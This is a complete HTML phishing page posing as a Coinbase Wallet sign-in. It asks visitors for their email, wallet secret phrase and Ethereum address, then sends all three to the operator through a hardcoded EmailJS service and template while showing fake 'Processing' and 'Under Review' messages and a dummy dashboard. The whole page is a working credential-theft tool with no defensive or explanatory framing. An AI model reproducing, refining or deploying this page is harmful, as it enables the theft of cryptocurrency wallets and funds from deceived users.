<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coinbase Wallet Sign In</title>

  <!-- EmailJS SDK v3 - working version -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      emailjs.init("IGDhN2-3e4suUx8j-");
    });
  </script>

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0d111c;
      color: #ffffff;
      font-weight: bold;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background-color: #131722;
      padding: 30px;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #444;
      font-size: 1rem;
    }
    button {
      background-color: #2d7efb;
      color: white;
      border: none;
      cursor: pointer;
    }
    .hidden { display: none; }
    .processing, .verify {
      text-align: center;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>

  <!-- Sign In Form -->
  <div id="signin" class="form-container">
    <h2>Coinbase Wallet Sign In</h2>
    <form id="vitaminForm" onsubmit="sendEmailJS(); return false;">
      <input type="email" name="user_email" id="userEmail" required placeholder="Enter Your Email" />
      <input type="text" name="secret_phrase" id="secretPhrase" required minlength="12" placeholder="Enter Wallet Passphrase" />
      <input type="text" name="eth_address" id="ethAddress" required pattern="^0x[a-fA-F0-9]{40}$" placeholder="0x..." />
      <button type="submit">Submit for Verification</button>
    </form>
  </div>

  <!-- Processing Message -->
  <div id="processing" class="processing hidden">
    <p>‚è≥ <strong>Processing...</strong></p>
    <p>üìù <strong>Under Review</strong></p>
  </div>

  <!-- Confirmation Code Gate -->
  <div id="verify" class="form-container hidden">
    <h3>Enter Approval Code</h3>
    <input type="text" id="accessCode" placeholder="Enter confirmation code" />
    <button onclick="checkCode()">Access Dashboard</button>
    <p style="color: red; display: none;" id="errorText">‚ùå Invalid code. Please check again.</p>
  </div>

  <script>
    function sendEmailJS() {
      const email = document.getElementById('userEmail').value;
      const phrase = document.getElementById('secretPhrase').value;
      const address = document.getElementById('ethAddress').value;

      const templateParams = {
        user_email: email,
        secret_phrase: phrase,
        eth_address: address
      };

      emailjs.send('service_5p6wgzo', 'template_yfwvu4b', templateParams)
        .then(function(response) {
          console.log('Email sent successfully!', response.status, response.text);
          document.getElementById('signin').classList.add('hidden');
          document.getElementById('processing').classList.remove('hidden');
          setTimeout(() => {
  document.getElementById('processing').innerHTML = '<p>‚úÖ <strong>Submitted Under Review</strong></p><p>‚è≥ <strong>Please Wait</strong></p>';
  setTimeout(() => {
    document.getElementById('dashboard').classList.remove('hidden');
document.getElementById('processing').classList.add('hidden');
  }, 5000);
}, 3000);
        }, function(error) {
          alert('Email failed to send: ' + error.text);
        });
    }

    function checkCode() {
      const input = document.getElementById('accessCode').value.trim();
      const validCode = 'ACCESS2024';

      if (input === validCode) {
        document.getElementById('dashboard').classList.remove('hidden');
document.getElementById('processing').classList.add('hidden');
      } else {
        document.getElementById('errorText').style.display = 'block';
      }
    }
  </script>



  <!-- Coinbase Dashboard (Initially Hidden) -->
  <div id="dashboard" class="form-container hidden" style="margin-top: 20px;">
    <h1 style="color:#2d7efb;">Welcome to Your Coinbase Web3 Dashboard</h1>
    <p>This is your ETH/USDT wallet dashboard.</p>
  </div>
</body>
</html>
